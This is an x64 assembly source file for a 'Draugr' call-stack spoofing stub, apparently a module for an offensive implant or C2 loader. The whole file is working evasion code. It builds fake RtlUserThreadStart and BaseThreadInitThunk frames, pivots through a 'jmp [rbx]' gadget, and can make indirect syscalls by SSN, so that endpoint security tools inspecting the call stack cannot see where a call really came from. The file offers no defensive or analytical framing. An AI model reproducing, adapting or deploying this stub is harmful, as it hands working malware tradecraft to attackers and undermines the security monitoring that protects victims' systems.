; Draugr call-stack spoofing stub.
; Assembled as flat binary: nasm -f bin src/draugr.asm -o bin/draugr.x64.bin
; Loaded via: load "bin/draugr.x64.bin" / linkfunc "draugr_stub"
;
; Signature (Win64 calling convention):
;   draugr_stub(arg1, arg2, arg3, arg4, DRAUGR_PARAMETERS*, func, size=8, arg5..arg12)
;   rcx=arg1  rdx=arg2  r8=arg3  r9=arg4
;   [rsp+0x28]=params  [rsp+0x30]=func  [rsp+0x38]=8  [rsp+0x40..]=arg5..12

[BITS 64]

draugr_stub:
    pop rax                 ; real return address → rax

    mov r10, rdi            ; save rdi
    mov r11, rsi            ; save rsi

    mov rdi, [rsp + 0x20]   ; rdi = DRAUGR_PARAMETERS*
    mov rsi, [rsp + 0x28]   ; rsi = function to call

    mov [rdi + 24],  r10    ; ->Rdi
    mov [rdi + 88],  r11    ; ->Rsi
    mov [rdi + 96],  r12    ; ->R12
    mov [rdi + 104], r13    ; ->R13
    mov [rdi + 112], r14    ; ->R14
    mov [rdi + 120], r15    ; ->R15

    mov r12, rax            ; r12 = real return address

    xor r11, r11            ; extra-arg counter
    mov r13, [rsp + 0x30]   ; total extra args to relocate (=8)

    ; RSP displacement = 0x200 scratch + 8 (null slot) + RUTS frame + BTIT frame
    ;                    + trampoline frame - 0x20 (shadow; loop sub-steps by 8)
    mov r14, 0x200
    add r14, 8
    add r14, [rdi + 56]     ; RtlUserThreadStart frame size
    add r14, [rdi + 48]     ; trampoline frame size
    add r14, [rdi + 32]     ; BaseThreadInitThunk frame size
    sub r14, 0x20

    mov r10, rsp
    add r10, 0x30           ; r10 → first extra stack arg (arg5)

looping:
    xor r15, r15
    cmp r11d, r13d
    je  finish
    sub r14, 8
    mov r15, rsp
    sub r15, r14
    add r10, 8
    push qword [r10]
    pop  qword [r15]
    add r11, 1
    jmp looping

finish:
    sub rsp, 0x200          ; 0x200 scratch region

    push 0                  ; NULL — chain terminator

    sub rsp, [rdi + 56]     ; RtlUserThreadStart frame
    mov r11, [rdi + 64]     ; ->RtlUserThreadStartReturnAddress
    mov [rsp], r11

    sub rsp, [rdi + 32]     ; BaseThreadInitThunk frame
    mov r11, [rdi + 40]     ; ->BaseThreadInitThunkReturnAddress
    mov [rsp], r11

    sub rsp, [rdi + 48]     ; trampoline frame
    mov r11, [rdi + 80]     ; ->Trampoline (jmp [rbx] gadget)
    mov [rsp], r11

    mov r11, rsi            ; r11 = function to call
    mov [rdi + 8],  r12     ; ->OriginalReturnAddress
    mov [rdi + 16], rbx     ; ->Rbx
    lea rbx, [rel fixup]
    mov [rdi + 0],  rbx     ; ->Fixup = &fixup
    mov rbx, rdi            ; rbx = DRAUGR_PARAMETERS* (jmp [rbx] → [&Fixup])

    mov r10, rcx            ; syscall ABI: r10 = rcx
    mov rax, [rdi + 72]     ; ->Ssn (0 if not a syscall)

    jmp r11

fixup:
    ; entered via gadget: jmp [rbx] where [rbx] = &Fixup
    ; rax = return value
    mov rcx, rbx
    add rsp, 0x200
    add rsp, [rbx + 48]     ; trampoline frame
    add rsp, [rbx + 32]     ; BaseThreadInitThunk frame
    add rsp, [rbx + 56]     ; RtlUserThreadStart frame

    mov rbx, [rcx + 16]
    mov rdi, [rcx + 24]
    mov rsi, [rcx + 88]
    mov r12, [rcx + 96]
    mov r13, [rcx + 104]
    mov r14, [rcx + 112]
    mov r15, [rcx + 120]

    push rax
    xor  rax, rax
    pop  rax

    jmp qword [rcx + 8]     ; → OriginalReturnAddress
